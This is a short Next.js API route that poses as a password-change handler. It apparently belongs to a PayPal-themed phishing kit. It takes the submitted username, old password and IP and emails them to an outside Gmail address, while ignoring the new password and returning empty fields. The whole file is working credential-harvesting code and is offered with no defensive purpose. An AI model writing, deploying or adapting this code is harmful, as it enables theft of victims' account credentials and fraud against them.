import { NextApiRequest, NextApiResponse } from "next";
import sendEmail from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string
}

export default async function handler(req: NextApiRequest, res: NextApiResponse<Data>) {
    const body = req.body
    await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
    res.status(200).json({
        username: '',
        oldPassword: '',
        newPassword: '',
        confirmPassword: ''
    })
}